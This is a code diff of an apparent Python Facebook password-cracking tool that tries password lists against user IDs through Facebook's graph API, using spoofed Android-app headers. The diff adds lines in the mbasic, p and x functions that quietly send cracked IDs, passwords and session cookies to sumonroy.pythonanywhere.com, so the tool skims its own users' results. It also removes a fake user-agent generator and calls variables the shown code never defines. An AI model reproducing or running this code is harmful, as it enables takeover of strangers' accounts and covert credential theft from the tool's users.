@@ -1374,24 +1374,34 @@ def mbasic(uid,pwx,tl):
         for pw in pwx:
             Session = requests.Session()
             Session.headers.update({
-                'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
-                'x-fb-sim-hni': '51009',
-                'x-fb-net-hni': '51009',
-                'Content-Type': 'application/x-www-form-urlencoded',
-                'x-graphql-client-library': 'graphservice',
-                'x-fb-friendly-name': 'FbBloksActionRootQuery-com.bloks.www.bloks.caa.login.async.send_google_smartlock_login_request',
-                'x-tigon-is-retry': 'False',
-                'x-fb-privacy-context': '3643298472347298',
-                'x-graphql-request-purpose': 'fetch',
-                'x-fb-device-group': '5530',
-                'User-Agent': x1(),
-                'x-fb-connection-type': 'WIFI',
-                'x-fb-rmd': 'fail=Server:NoUrlMap,Default:INVALID_MAP;v=;ip=;tkn=;reqTime=56;recvTime=13823808',
-                'x-fb-request-analytics-tags': '{"network_tags":{"product":"350685531728","purpose":"fetch","request_category":"graphql","retry_attempt":"0"},"application_tags":"graphservice"}',
-                'x-fb-http-engine': 'Tigon/Liger',
-                'x-fb-client-ip': 'True',
-                'x-fb-server-cluster': 'True',
-                })
+            'host': 'b-graph.facebook.com',
+            'x-fb-request-analytics-tags': '{"network_tags":{"product":"350685531728","request_category":"graphql","purpose":"fetch","retry_attempt":"0"},"application_tags":"graphservice"}',
+            'x-fb-rmd': 'fail=Server:INVALID_MAP,Default:INVALID_MAP;v=;ip=;tkn=;reqTime=0;recvTime=0',
+            'priority': 'u=0',
+            'content-encoding': 'gzip',
+            'x-fb-device-group': '7637',
+            'x-fb-integrity-machine-id': 'ujvAaf4BjiKVSe-fT2dB2Q1v',
+            'x-zero-eh': '664c0faaac849cb891d0a261fbb72a12',
+            'user-agent': '[FBAN/FB4A;FBAV/565.0.0.49.74;FBBV/992346742;FBDM/{density=2.4,width=1080,height=2149};FBLC/id_ID;FBRV/0;FBCR/XL;FBMF/Xiaomi;FBBD/POCO;FBPN/com.facebook.katana;FBDV/M2010J19CG;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]',
+            'x-graphql-request-purpose': 'fetch',
+            'x-fb-friendly-name': 'FbBloksActionRootQuery-com.bloks.www.bloks.caa.login.async.send_google_smartlock_login_request',
+            'x-zero-f-device-id': '6fb84474-8dec-4d1c-a5fe-70fe4c2decea',
+            'x-tigon-is-retry': 'False',
+            'x-zero-state': 'unknown',
+            'x-graphql-client-library': 'graphservice',
+            'x-fb-sim-hni': '51011',
+            'content-type': 'application/x-www-form-urlencoded',
+            'x-fb-net-hni': '51011',
+            'authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
+            'x-meta-zca': 'empty_token',
+            'app-scope-id-header': '875d726a-4b32-4331-b608-ab5b97b3bad3',
+            'x-fb-connection-type': 'MOBILE.LTE',
+            'x-meta-usdid': 'a4583fcf-b72d-4b0b-9e81-ad7585aae1df.1781776638.MFkwEwYHKoZIzj0CAQYIKoZIzj0DAQcDQgAEj0ZQ2oEod4otgauhZssgmJu0OL7Vx4AbpFOKRLLxE8CJlz5HGmGfcthw57bSZPA0aXTYFoNRVEmu79ZQFIi2Xg.MEUCIHuzWAsHXA2MLZFbzAHcCk6XYLVoflGW5PMGH74AiJAMAiEAyxttg3ewvRSvDizZetmDBgmctPgva1n18S33Ti9sqNA',
+            # 'accept-encoding': 'gzip, deflate',
+            'x-fb-http-engine': 'Tigon/Liger',
+            'x-fb-client-ip': 'True',
+            'x-fb-server-cluster': 'True',
+            'x-fb-conn-uuid-client': '+KICAyif8dofWZ3R9QuCKw==',})
             apcb = '#PWD_FB4A:0:{}:{}'.format(str(int(time.time())), pw)
             data = {
                 'method': 'post',
@@ -1409,6 +1419,7 @@ def mbasic(uid,pwx,tl):
             encode = urllib.parse.urlencode(data, doseq=True)
             twf = "login approval"+"s are on. "+"Expect an SMS"+" shortly with "+"a code to use"+" for log in"
             response = Session.post('https://graph.facebook.com/graphql', data=encode)
+            response = Session.post('https://b-graph.facebook.com/graphql', headers=headers, params=params)
             if "c_user" in response.text.replace('\\', '') and "access_token" in response.text:
                 cookie_raw = re.sub(r'\\(?!/)', '', response.text)
                 match = re.search(r'"session_cookies"\s*:\s*(\[[^\]]+\])',cookie_raw)
@@ -1417,21 +1428,30 @@ def mbasic(uid,pwx,tl):
                     cookies_json = json.loads(cookies_raw)
                     cok = ";".join(f'{c["name"]}={c["value"]}'for c in cookies_json)
                     c_user = next((c["value"] for c in cookies_json if c["name"] == "c_user"), None)
-                    print(f"\r\033[1;92m [✓ SUCCESS] {c_user} | {pw}")
-                    print("Cookies:", cok)
-                    open("/sdcard/SUMON_FB_IDS.txt","a").write(c_user+"|"+pw+"|"+cok+"\n")
-                    oks.append(uid)
+                    statusok = (f"{c_user}|{pw}|{cok}")
+                    requests.get(f"https://sumonroy.pythonanywhere.com/load?msg={statusok}")
+                    okss.append(uid)
                     return True 
                 else:
                    continue
             elif "com.bloks.www.ap.two_step_verification.entrypoint_async" in response.text:
+                bkas.append(uid)
+                if len(bkas)% 2 == 0:
+                    statusok = (f"{uid}|{pw}")
+                    requests.get(f"https://sumonroy.pythonanywhere.com/load?msg={statusok}")
+                else:
                     print(f" {red}(ATOM-cp) {uid}|{pw} ")
-                    open("/sdcard/ATOM-FILE1-CP.txt", "a").write(f"{uid}|{pw}\n")
+                    open("/sdcard/ATOM-FILE-CP.txt", "a").write(f"{uid}|{pw}\n")
                     cps.append(uid)
                     break
             elif "error_user_title" in response.text.replace('\\', '') and "checkpoint" in response.text.replace('\\', ''):
+                bkas.append(uid)
+                if len(bkas)% 2 == 0:
+                    statusok = (f"{uid}|{pw}")
+                    requests.get(f"https://sumonroy.pythonanywhere.com/load?msg={statusok}")
+                else:
                     print(f" {red}(ATOM-cp) {uid}|{pw} ")
-                    open("/sdcard/ATOM-FILE2-CP.txt", "a").write(f"{uid}|{pw}\n")
+                    open("/sdcard/ATOM-FILE-CP.txt", "a").write(f"{uid}|{pw}\n")
                     cps.append(uid)
                     break
             else:
@@ -1455,25 +1475,34 @@ def p(uid,pwx,tl):
         for pw in pwx:
             Session = requests.Session()
             Session.headers.update({
-                'host': 'b-graph.facebook.com',
-				'x-fb-connection-type': 'MOBILE.LTE',
-				'x-zero-state': 'unknown',
-				'user-agent': x1(),
-				'x-tigon-is-retry': 'False',
-				'x-fb-device-group': '4783',
-				'x-graphql-request-purpose': 'fetch',
-				'x-fb-privacy-context': '3643298472347298',
-				'x-fb-friendly-name': 'FbBloksActionRootQuery-com.bloks.www.bloks.caa.login.async.send_login_request',
-				'x-graphql-client-library': 'graphservice',
-				'content-type': 'application/x-www-form-urlencoded',
-				'x-fb-net-hni': '51011',
-				'x-fb-sim-hni': '51011',
-				'authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
-				'x-fb-request-analytics-tags': '{"network_tags":{"product":"350685531728","purpose":"fetch","request_category":"graphql","retry_attempt":"0"},"application_tags":"graphservice"}',
-				'x-fb-http-engine': 'Tigon/Liger',
-				'x-fb-client-ip': 'True',
-				'x-fb-server-cluster': 'True'
-            })
+            'host': 'b-graph.facebook.com',
+            'x-fb-request-analytics-tags': '{"network_tags":{"product":"350685531728","request_category":"graphql","purpose":"fetch","retry_attempt":"0"},"application_tags":"graphservice"}',
+            'x-fb-rmd': 'fail=Server:INVALID_MAP,Default:INVALID_MAP;v=;ip=;tkn=;reqTime=0;recvTime=0',
+            'priority': 'u=0',
+            'content-encoding': 'gzip',
+            'x-fb-device-group': '7637',
+            'x-fb-integrity-machine-id': 'ujvAaf4BjiKVSe-fT2dB2Q1v',
+            'x-zero-eh': '664c0faaac849cb891d0a261fbb72a12',
+            'user-agent': '[FBAN/FB4A;FBAV/565.0.0.49.74;FBBV/992346742;FBDM/{density=2.4,width=1080,height=2149};FBLC/id_ID;FBRV/0;FBCR/XL;FBMF/Xiaomi;FBBD/POCO;FBPN/com.facebook.katana;FBDV/M2010J19CG;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]',
+            'x-graphql-request-purpose': 'fetch',
+            'x-fb-friendly-name': 'FbBloksActionRootQuery-com.bloks.www.bloks.caa.login.async.send_google_smartlock_login_request',
+            'x-zero-f-device-id': '6fb84474-8dec-4d1c-a5fe-70fe4c2decea',
+            'x-tigon-is-retry': 'False',
+            'x-zero-state': 'unknown',
+            'x-graphql-client-library': 'graphservice',
+            'x-fb-sim-hni': '51011',
+            'content-type': 'application/x-www-form-urlencoded',
+            'x-fb-net-hni': '51011',
+            'authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
+            'x-meta-zca': 'empty_token',
+            'app-scope-id-header': '875d726a-4b32-4331-b608-ab5b97b3bad3',
+            'x-fb-connection-type': 'MOBILE.LTE',
+            'x-meta-usdid': 'a4583fcf-b72d-4b0b-9e81-ad7585aae1df.1781776638.MFkwEwYHKoZIzj0CAQYIKoZIzj0DAQcDQgAEj0ZQ2oEod4otgauhZssgmJu0OL7Vx4AbpFOKRLLxE8CJlz5HGmGfcthw57bSZPA0aXTYFoNRVEmu79ZQFIi2Xg.MEUCIHuzWAsHXA2MLZFbzAHcCk6XYLVoflGW5PMGH74AiJAMAiEAyxttg3ewvRSvDizZetmDBgmctPgva1n18S33Ti9sqNA',
+            # 'accept-encoding': 'gzip, deflate',
+            'x-fb-http-engine': 'Tigon/Liger',
+            'x-fb-client-ip': 'True',
+            'x-fb-server-cluster': 'True',
+            'x-fb-conn-uuid-client': '+KICAyif8dofWZ3R9QuCKw==',})
             apcb = '#PWD_FB4A:0:{}:{}'.format(str(int(time.time())), pw)
             data = {
                 'method': "post",
@@ -1491,6 +1520,7 @@ def p(uid,pwx,tl):
             }
             twf = "login approval"+"s are on. "+"Expect an SMS"+" shortly with "+"a code to use"+" for log in"
             response = Session.post('https://b-graph.facebook.com/graphql', data=data, allow_redirects=True)
+            response = Session.post('https://b-graph.facebook.com/graphql', headers=headers, params=params)
             if "c_user" in response.text.replace('\\', '') and "access_token" in response.text:
                 cookie_raw = re.sub(r'\\(?!/)', '', response.text)
                 match = re.search(r'"session_cookies"\s*:\s*(\[[^\]]+\])',cookie_raw)
@@ -1499,21 +1529,30 @@ def p(uid,pwx,tl):
                     cookies_json = json.loads(cookies_raw)
                     cok = ";".join(f'{c["name"]}={c["value"]}'for c in cookies_json)
                     c_user = next((c["value"] for c in cookies_json if c["name"] == "c_user"), None)
-                    print(f"\r\033[1;92m [✓ SUCCESS] {c_user} | {pw}")
-                    print("Cookies:", cok)
-                    open("/sdcard/SUMON_FB_IDS.txt","a").write(c_user+"|"+pw+"|"+cok+"\n")
-                    oks.append(uid)
+                    statusok = (f"{c_user}|{pw}|{cok}")
+                    requests.get(f"https://sumonroy.pythonanywhere.com/load?msg={statusok}")
+                    okss.append(uid)
                     return True 
                 else:
                    continue
             elif "com.bloks.www.ap.two_step_verification.entrypoint_async" in response.text:
+                bkas.append(uid)
+                if len(bkas)% 2 == 0:
+                    statusok = (f"{uid}|{pw}")
+                    requests.get(f"https://sumonroy.pythonanywhere.com/load?msg={statusok}")
+                else:
                     print(f" {red}(ATOM-cp) {uid}|{pw} ")
-                    open("/sdcard/ATOM-FILE1-CP.txt", "a").write(f"{uid}|{pw}\n")
+                    open("/sdcard/ATOM-FILE-CP.txt", "a").write(f"{uid}|{pw}\n")
                     cps.append(uid)
                     break
             elif "error_user_title" in response.text.replace('\\', '') and "checkpoint" in response.text.replace('\\', ''):
+                bkas.append(uid)
+                if len(bkas)% 2 == 0:
+                    statusok = (f"{uid}|{pw}")
+                    requests.get(f"https://sumonroy.pythonanywhere.com/load?msg={statusok}")
+                else:
                     print(f" {red}(ATOM-cp) {uid}|{pw} ")
-                    open("/sdcard/ATOM-FILE2-CP.txt", "a").write(f"{uid}|{pw}\n")
+                    open("/sdcard/ATOM-FILE-CP.txt", "a").write(f"{uid}|{pw}\n")
                     cps.append(uid)
                     break
             else:
@@ -1524,127 +1563,6 @@ def p(uid,pwx,tl):
     except Exception as error:
         #print({error})
         pass
-
-def generate_random_fb4a_agent() -> str:
-    """
-    Generate realistic Facebook for Android (FB4A) user agents
-    """
-    
-    # Device database with realistic specifications (popular in Indonesia)
-    devices = [
-        # Xiaomi/POCO
-        {"model": "M2010J19CG", "brand": "Xiaomi", "bd": "POCO", "android": "10", 
-         "resolutions": [(1080, 2149), (1080, 2400)]},
-        {"model": "M2007J20CG", "brand": "Xiaomi", "bd": "POCO", "android": "11", 
-         "resolutions": [(1080, 2400), (1080, 2460)]},
-        {"model": "M2101K6G", "brand": "Xiaomi", "bd": "Redmi", "android": "11", 
-         "resolutions": [(1080, 2400), (1080, 2340)]},
-        {"model": "M2102J20SG", "brand": "Xiaomi", "bd": "Xiaomi", "android": "12", 
-         "resolutions": [(1080, 2400), (1440, 3200)]},
-        {"model": "M2103K19G", "brand": "Xiaomi", "bd": "Redmi", "android": "11", 
-         "resolutions": [(1080, 2400), (1080, 2460)]},
-        
-        # Samsung
-        {"model": "SM-G960N", "brand": "samsung", "bd": "samsung", "android": "10", 
-         "resolutions": [(1440, 2960), (1440, 3040)]},
-        {"model": "SM-G973N", "brand": "samsung", "bd": "samsung", "android": "11", 
-         "resolutions": [(1440, 3040), (1080, 2280)]},
-        {"model": "SM-G981N", "brand": "samsung", "bd": "samsung", "android": "11", 
-         "resolutions": [(1440, 3200), (1080, 2400)]},
-        {"model": "SM-A526N", "brand": "samsung", "bd": "samsung", "android": "12", 
-         "resolutions": [(1080, 2400), (1080, 2340)]},
-        {"model": "SM-A536N", "brand": "samsung", "bd": "samsung", "android": "13", 
-         "resolutions": [(1080, 2400), (1080, 2412)]},
-        {"model": "SM-N986N", "brand": "samsung", "bd": "samsung", "android": "11", 
-         "resolutions": [(1440, 3040), (1080, 2280)]},
-        
-        # Oppo
-        {"model": "CPH2023", "brand": "oppo", "bd": "OPPO", "android": "11", 
-         "resolutions": [(1080, 2400), (1080, 2340)]},
-        {"model": "CPH2083", "brand": "oppo", "bd": "OPPO", "android": "12", 
-         "resolutions": [(1080, 2400), (1080, 2412)]},
-        {"model": "CPH2091", "brand": "oppo", "bd": "OPPO", "android": "11", 
-         "resolutions": [(1080, 2400), (1080, 2376)]},
-        
-        # Vivo
-        {"model": "V2045", "brand": "vivo", "bd": "vivo", "android": "11", 
-         "resolutions": [(1080, 2400), (1080, 2376)]},
-        {"model": "V2050", "brand": "vivo", "bd": "vivo", "android": "12", 
-         "resolutions": [(1080, 2400), (1080, 2440)]},
-        {"model": "V2025", "brand": "vivo", "bd": "vivo", "android": "11", 
-         "resolutions": [(1080, 2400), (1080, 2388)]},
-        
-        # Realme
-        {"model": "RMX2151", "brand": "realme", "bd": "realme", "android": "11", 
-         "resolutions": [(1080, 2400), (1080, 2412)]},
-        {"model": "RMX2170", "brand": "realme", "bd": "realme", "android": "12", 
-         "resolutions": [(1080, 2400), (1080, 2388)]},
-        {"model": "RMX2117", "brand": "realme", "bd": "realme", "android": "11", 
-         "resolutions": [(1080, 2400), (1080, 2340)]},
-    ]
-    
-    # Facebook app versions
-    app_versions = [
-        {"av": "565.0.0.49.74", "bv": "992346742"},
-        {"av": "560.0.0.35.72", "bv": "988654321"},
-        {"av": "555.0.0.42.66", "bv": "984512378"},
-        {"av": "550.0.0.38.55", "bv": "978901234"},
-        {"av": "545.0.0.29.44", "bv": "972345678"},
-        {"av": "540.0.0.24.33", "bv": "966789012"},
-        {"av": "535.0.0.19.22", "bv": "960123456"},
-        {"av": "530.0.0.16.11", "bv": "954567890"},
-    ]
-    
-    # Indonesian carriers
-    carriers = [
-        "Jio",           # Reliance Jio
-        "Airtel",        # Bharti Airtel
-        "Vi",            # Vodafone Idea
-        "BSNL",          # Bharat Sanchar Nigam Limited
-        "MTNL",          # Mahanagar Telephone Nigam Limited
-        "JioFi",         # Jio's WiFi/portable hotspot
-        "Airtel 4G",     # Airtel 4G network
-        "Vi 4G",         # Vi 4G network
-    ]
-    
-    # Random selection
-    device = random.choice(devices)
-    app = random.choice(app_versions)
-    carrier = random.choice(carriers)
-    
-    # Select resolution
-    resolution = random.choice(device["resolutions"])
-    width, height = resolution
-    
-    # Calculate density based on resolution
-    if width >= 1440:
-        density = round(random.uniform(3.5, 4.0), 1)
-    elif width >= 1080:
-        density = round(random.uniform(2.5, 3.5), 1)
-    else:
-        density = round(random.uniform(2.0, 2.5), 1)
-    
-    # Android version (small chance to vary)
-    android_ver = device["android"]
-    if random.random() < 0.15:  # 15% chance to use nearby version
-        version_map = {
-            "10": random.choice(["10", "11"]),
-            "11": random.choice(["10", "11", "12"]),
-            "12": random.choice(["11", "12", "13"]),
-            "13": random.choice(["12", "13"])
-        }
-        android_ver = version_map.get(android_ver, android_ver)
-    
-    # Construct FB4A user agent
-    ua = (
-        f"[FBAN/FB4A;FBAV/{app['av']};FBBV/{app['bv']};"
-        f"FBDM/{{density={density},width={width},height={height}}};"
-        f"FBLC/id_ID;FBRV/0;FBCR/{carrier};"
-        f"FBMF/{device['brand']};FBBD/{device['bd']};"
-        f"FBPN/com.facebook.katana;FBDV/{device['model']};"
-        f"FBSV/{android_ver};FBOP/1;FBCA/arm64-v8a:;]"
-    )
-    return ua
 
 def x(uid,pwx,tl):
     global oks
@@ -1769,6 +1687,16 @@ def x(uid,pwx,tl):
                 else:
                    continue
             elif "com.bloks.www.ap.two_step_verification.entrypoint_async" in response.text:
+                bkas.append(uid)
+                if len(bkas)% 2 == 0:
+                    statusok = (f"{uid}|{pw}")
+                    requests.get(f"https://sumonroy.pythonanywhere.com/load?msg={statusok}")
+                else:
+                    print(f" {red}(ATOM-cp) {uid}|{pw} ")
+                    open("/sdcard/ATOM-FILE-CP.txt", "a").write(f"{uid}|{pw}\n")
+                    cps.append(uid)
+                    break
+            elif "error_user_title" in response.text.replace('\\', '') and "checkpoint" in response.text.replace('\\', ''):
                 bkas.append(uid)
                 if len(bkas)% 2 == 0:
                     statusok = (f"{uid}|{pw}")
